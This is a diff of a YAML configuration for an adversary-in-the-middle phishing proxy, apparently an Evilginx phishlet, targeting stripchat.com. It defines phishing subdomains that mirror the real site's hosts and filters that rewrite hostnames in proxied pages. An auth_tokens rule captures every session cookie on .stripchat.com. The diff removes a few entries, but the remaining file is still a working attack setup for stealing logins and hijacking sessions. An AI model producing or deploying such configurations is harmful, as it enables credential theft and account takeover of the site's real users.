@@ -16,9 +16,8 @@ proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'stripchat.com', session: true, is_landing: true}
   - {phish_sub: 'assets', orig_sub: 'assets', domain: 'stripchat.com', session: true, is_landing: false}
   
-  - {phish_sub: 'go', orig_sub: 'go', domain: 'stripchat.com', session: false, is_landing: false}
+  
   - {phish_sub: 'sentry-public', orig_sub: 'sentry-public', domain: 'stripchat.com', session: false, is_landing: false}
-  - {phish_sub: 'websocket', orig_sub: 'websocket', domain: 'stripchat.com', session: false, is_landing: false}
   
 
 
@@ -28,21 +27,7 @@ sub_filters:
   - {triggers_on: 'stripchat.com', orig_sub: '', domain: 'stripchat.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'stripchat.com', orig_sub: '', domain: 'stripchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'stripchat.com', orig_sub: '', domain: 'stripchat.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'stripchat.com', orig_sub: 'assets', domain: 'stripchat.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'stripchat.com', orig_sub: 'assets', domain: 'stripchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'stripchat.com', orig_sub: 'assets', domain: 'stripchat.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
   
-
-  - {triggers_on: 'stripchat.com', orig_sub: 'go', domain: 'stripchat.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'stripchat.com', orig_sub: 'go', domain: 'stripchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'stripchat.com', orig_sub: 'go', domain: 'stripchat.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'stripchat.com', orig_sub: 'sentry-public', domain: 'stripchat.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'stripchat.com', orig_sub: 'sentry-public', domain: 'stripchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'stripchat.com', orig_sub: 'sentry-public', domain: 'stripchat.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'stripchat.com', orig_sub: 'websocket', domain: 'stripchat.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'stripchat.com', orig_sub: 'websocket', domain: 'stripchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'stripchat.com', orig_sub: 'websocket', domain: 'stripchat.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
- 
 auth_tokens:
   - domain: '.stripchat.com'
     keys: ['.*,regexp']
